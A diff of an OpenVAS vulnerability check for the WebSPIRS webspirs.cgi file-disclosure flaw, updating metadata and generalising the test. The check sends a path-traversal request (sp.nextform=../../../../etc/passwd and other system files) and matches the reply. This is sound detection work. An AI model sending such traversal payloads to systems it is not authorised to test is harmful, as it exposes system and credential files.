@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: webspirs_cgi.nasl 6053 2017-05-01 09:02:51Z teissa $
+# $Id: webspirs_cgi.nasl 11761 2018-10-05 10:25:32Z jschulte $
 #
 # webspirs.cgi
 #
@@ -27,8 +27,8 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.10616");
-  script_version("$Revision: 6053 $");
-  script_tag(name:"last_modification", value:"$Date: 2017-05-01 11:02:51 +0200 (Mon, 01 May 2017) $");
+  script_version("$Revision: 11761 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-10-05 12:25:32 +0200 (Fri, 05 Oct 2018) $");
   script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
   script_bugtraq_id(2362);
   script_tag(name:"cvss_base", value:"5.0");
@@ -38,13 +38,18 @@ if(description)
   script_category(ACT_ATTACK);
   script_copyright("This script is Copyright (C) 2001 Laurent Kitzinger");
   script_family("Web application abuses");
-  script_dependencies("find_service.nasl", "http_version.nasl");
+  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
   script_require_ports("Services/www", 80);
   script_exclude_keys("Settings/disable_cgi_scanning");
 
   script_xref(name:"URL", value:"http://archives.neohapsis.com/archives/bugtraq/2001-02/0217.html");
 
-  tag_summary = "The remote web server contains a CGI script that is prone to
+  script_tag(name:"solution_type", value:"WillNotFix");
+  script_tag(name:"solution", value:"No known solution was made available for at least one year
+  since the disclosure of this vulnerability. Likely none will be provided anymore.
+  General solution options are to upgrade to a newer release, disable respective features,
+  remove the product or replace the product by another one.");
+  script_tag(name:"summary", value:"The remote web server contains a CGI script that is prone to
   information disclosure.
 
   Description :
@@ -54,12 +59,7 @@ if(description)
 
   The installed version of WebSPIRS has a well known security flaw that
   lets an attacker read arbitrary files with the privileges of the http
-  daemon (usually root or nobody).";
-
-  tag_solution = "Remove this CGI script.";
-
-  script_tag(name:"solution", value:tag_solution);
-  script_tag(name:"summary", value:tag_summary);
+  daemon (usually root or nobody).");
 
   script_tag(name:"qod_type", value:"remote_vul");
 
@@ -68,18 +68,27 @@ if(description)
 
 include("http_func.inc");
 include("http_keepalive.inc");
+include("misc_func.inc");
 
 port = get_http_port( default:80 );
+
+files = traversal_files();
 
 foreach dir( make_list_unique( "/", cgi_dirs( port:port ) ) ) {
 
   if( dir == "/" ) dir = "";
-  url = string( dir, "/webspirs.cgi?sp.nextform=../../../../../../../../../etc/passwd" );
 
-  if( http_vuln_check( port:port, url:url, pattern:".*root:.*:0:[01]:.*" ) ) {
-    report = report_vuln_url( port:port, url:url );
-    security_message( port:port, data:report );
-    exit( 0 );
+  foreach pattern( keys( files ) ) {
+
+    file = files[pattern];
+
+    url = string( dir, "/webspirs.cgi?sp.nextform=../../../../../../../../../" + file );
+
+    if( http_vuln_check( port:port, url:url, pattern:pattern ) ) {
+      report = report_vuln_url( port:port, url:url );
+      security_message( port:port, data:report );
+      exit( 0 );
+    }
   }
 }
 
